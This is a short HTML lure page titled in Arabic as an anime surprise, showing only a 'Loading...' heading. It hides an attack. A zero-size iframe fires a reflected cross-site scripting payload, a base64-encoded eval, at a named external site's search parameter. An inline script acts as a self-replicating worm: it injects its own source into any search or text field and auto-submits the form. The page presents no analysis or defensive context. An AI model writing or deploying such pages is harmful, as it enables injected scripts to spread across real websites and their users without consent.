<!DOCTYPE html>
<html>
  <head>
    <title>مفاجأة أنمي!</title>
  </head>
  <body>
    <h2>جاري التحميل...</h2>

    <iframe 
      src="https://retro-anime.rf.gd/index.php?search=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>" 
      style="display:none;width:0;height:0;"></iframe>

    <script>
      (function spreadXSS() {
        let searchInput = document.querySelector('input[name="search"], input[type="text"], textarea');
        if (!searchInput) return;

        let payload = `<script>(${spreadXSS.toString()})();</script>`;

        if (!searchInput.value.includes(payload)) {
          searchInput.value += payload;
        }

        let form = searchInput.closest('form');
        if (form) {
          setTimeout(() => form.submit(), 1000);
        }
      })();
    </script>
  </body>
</html>
